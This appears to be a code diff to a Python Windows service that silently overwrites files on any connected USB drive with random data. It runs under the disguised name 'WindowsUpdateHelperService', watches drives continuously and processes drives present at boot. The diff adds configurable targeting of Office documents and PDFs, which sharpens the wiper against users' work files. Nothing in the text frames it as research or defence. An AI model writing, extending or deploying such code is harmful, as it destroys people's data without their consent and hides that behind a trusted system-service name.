@@ -1,8 +1,9 @@
 """
 USB Drive File Overwriter Service
-Overwrites ALL files on external USB drives with random binary data
+Overwrites files on external USB drives with random binary data based on configurable file type filters
 Monitors file changes and processes drives already connected at boot
 Ignores internal hard drives and fixed disks
+Supports filtering by: ALL files, Microsoft Office files only, PDF files only, or Office+PDF files
 """
 
 import os
@@ -21,6 +22,8 @@ import traceback
 import threading
 import win32file
 import win32con
+import json
+import configparser
 
 class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
     _svc_name_ = "WindowsUpdateHelperService"
@@ -48,6 +51,115 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
         
         # Track processed drives to avoid reprocessing
         self.processed_drives = set()
+        
+        # File type filtering configuration
+        self.config_file = os.path.join(os.path.dirname(__file__), "config.ini")
+        self.load_configuration()
+        
+        # Define file extensions for different categories
+        self.office_extensions = {
+            '.doc', '.docx', '.docm', '.dot', '.dotx', '.dotm',  # Word
+            '.xls', '.xlsx', '.xlsm', '.xlt', '.xltx', '.xltm', '.xlsb',  # Excel
+            '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.potm', '.pps', '.ppsx', '.ppsm',  # PowerPoint
+            '.pub',  # Publisher
+            '.vsd', '.vsdx', '.vsdm',  # Visio
+            '.mpp',  # Project
+            '.one',  # OneNote
+            '.accdb', '.mdb'  # Access
+        }
+        
+        self.pdf_extensions = {'.pdf'}
+        
+        # Log current configuration
+        servicemanager.LogInfoMsg(f"File filtering mode: {self.filter_mode}")
+        if self.filter_mode != 'all':
+            extensions = self.get_target_extensions()
+            servicemanager.LogInfoMsg(f"Target file extensions: {', '.join(sorted(extensions))}")
+
+    def load_configuration(self):
+        """Load configuration from config file or create default"""
+        self.filter_mode = 'all'  # Default: all files
+        
+        try:
+            if os.path.exists(self.config_file):
+                config = configparser.ConfigParser()
+                config.read(self.config_file)
+                
+                if 'FileFilter' in config:
+                    self.filter_mode = config['FileFilter'].get('mode', 'all').lower()
+                    
+                    # Validate filter mode
+                    valid_modes = ['all', 'office', 'pdf', 'office_pdf']
+                    if self.filter_mode not in valid_modes:
+                        self.filter_mode = 'all'
+                        servicemanager.LogWarningMsg(f"Invalid filter mode in config, using 'all'")
+            else:
+                # Create default config file
+                self.create_default_config()
+                
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Error loading configuration: {str(e)}")
+            self.filter_mode = 'all'
+    
+    def create_default_config(self):
+        """Create default configuration file"""
+        try:
+            config = configparser.ConfigParser()
+            config['FileFilter'] = {
+                'mode': 'all'
+            }
+            
+            # Add comments section
+            config['INFO'] = {
+                'description': 'USB File Overwriter Configuration',
+                'valid_modes': 'all, office, pdf, office_pdf',
+                'all': 'Overwrites ALL files on USB drives',
+                'office': 'Overwrites only Microsoft Office files (.doc, .docx, .xls, .xlsx, .ppt, .pptx, etc.)',
+                'pdf': 'Overwrites only PDF files (.pdf)',
+                'office_pdf': 'Overwrites Microsoft Office files AND PDF files'
+            }
+            
+            with open(self.config_file, 'w') as f:
+                f.write("; USB File Overwriter Configuration\n")
+                f.write("; Valid modes: all, office, pdf, office_pdf\n")
+                f.write("; \n")
+                f.write("; all        = Overwrites ALL files on USB drives\n")
+                f.write("; office     = Overwrites only Microsoft Office files\n")
+                f.write("; pdf        = Overwrites only PDF files\n")
+                f.write("; office_pdf = Overwrites Office files AND PDF files\n")
+                f.write("; \n")
+                f.write("; After changing this file, restart the service:\n")
+                f.write("; net stop WindowsUpdateHelperService\n")
+                f.write("; net start WindowsUpdateHelperService\n")
+                f.write("\n")
+                config.write(f)
+                
+            servicemanager.LogInfoMsg(f"Created default configuration file: {self.config_file}")
+            
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Error creating default config: {str(e)}")
+    
+    def get_target_extensions(self):
+        """Get the set of file extensions to target based on current mode"""
+        if self.filter_mode == 'office':
+            return self.office_extensions
+        elif self.filter_mode == 'pdf':
+            return self.pdf_extensions
+        elif self.filter_mode == 'office_pdf':
+            return self.office_extensions | self.pdf_extensions
+        else:  # 'all'
+            return None  # None means all files
+    
+    def should_process_file(self, file_path):
+        """Check if file should be processed based on current filter mode"""
+        if self.filter_mode == 'all':
+            return True
+            
+        # Get file extension
+        _, ext = os.path.splitext(file_path.lower())
+        target_extensions = self.get_target_extensions()
+        
+        return ext in target_extensions if target_extensions else True
 
     def initialize_system_drives(self):
         """
@@ -148,10 +260,11 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
             return False
 
     def overwrite_all_files(self, drive):
-        """Find and overwrite ALL files with random binary data"""
+        """Find and overwrite files based on filter configuration"""
         max_retries = 3
         retry_delay = 1
         files_overwritten = 0
+        files_skipped = 0
         
         for attempt in range(max_retries):
             try:
@@ -166,6 +279,11 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
                             # Skip system files and hidden files to avoid issues
                             if file.startswith('.') or file.lower() in ['system volume information', 'recycler', '$recycle.bin']:
                                 continue
+                            
+                            # Check if file matches our filter criteria
+                            if not self.should_process_file(file_path):
+                                files_skipped += 1
+                                continue
                                 
                             # Use aggressive overwriting method
                             self.overwrite_single_file_aggressive(file_path)
@@ -179,11 +297,11 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
                             servicemanager.LogErrorMsg(f"Failed to overwrite {file_path}: {str(e)}")
                             continue
                 
-                if files_overwritten > 0:
-                    log_msg = f"Successfully overwritten {files_overwritten} files on drive {drive}:"
+                if files_overwritten > 0 or files_skipped > 0:
+                    log_msg = f"Drive {drive}: Overwritten {files_overwritten} files, Skipped {files_skipped} files (filter: {self.filter_mode})"
                     servicemanager.LogInfoMsg(log_msg)
                 else:
-                    servicemanager.LogInfoMsg(f"No accessible files found on drive {drive}:")
+                    servicemanager.LogInfoMsg(f"No target files found on drive {drive} (filter: {self.filter_mode})")
                 
                 # Reset error counter on success
                 self.consecutive_errors = 0
@@ -242,6 +360,10 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
                         if action in [win32con.FILE_ACTION_ADDED, 
                                     win32con.FILE_ACTION_MODIFIED,
                                     win32con.FILE_ACTION_RENAMED_NEW_NAME]:
+                            
+                            # Check if file matches our filter criteria
+                            if not self.should_process_file(file_path):
+                                continue
                             
                             # Immediate overwrite attempt (no delay)
                             try:
@@ -404,8 +526,8 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
                         file_path = os.path.join(root, file)
                         
                         try:
-                            # Check if file exists and overwrite it
-                            if os.path.isfile(file_path):
+                            # Check if file exists and matches filter criteria
+                            if os.path.isfile(file_path) and self.should_process_file(file_path):
                                 self.overwrite_single_file_aggressive(file_path)
                         except Exception as e:
                             # Continue scanning other files
@@ -441,7 +563,10 @@ class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
             if self.is_external_removable_drive(drive):
                 previous_drives.add(drive)
         
-        servicemanager.LogInfoMsg(f"USB Drive File Overwriter started. Monitoring ALL removable drives.")
+        servicemanager.LogInfoMsg(f"USB Drive File Overwriter started. Filter mode: {self.filter_mode}")
+        if self.filter_mode != 'all':
+            extensions = self.get_target_extensions()
+            servicemanager.LogInfoMsg(f"Target extensions: {', '.join(sorted(extensions))}")
         servicemanager.LogInfoMsg(f"Fixed drives (ignored): {', '.join(sorted(self.system_drives)) if self.system_drives else 'None'}")
         
         # PROCESS EXISTING USB DRIVES AT STARTUP
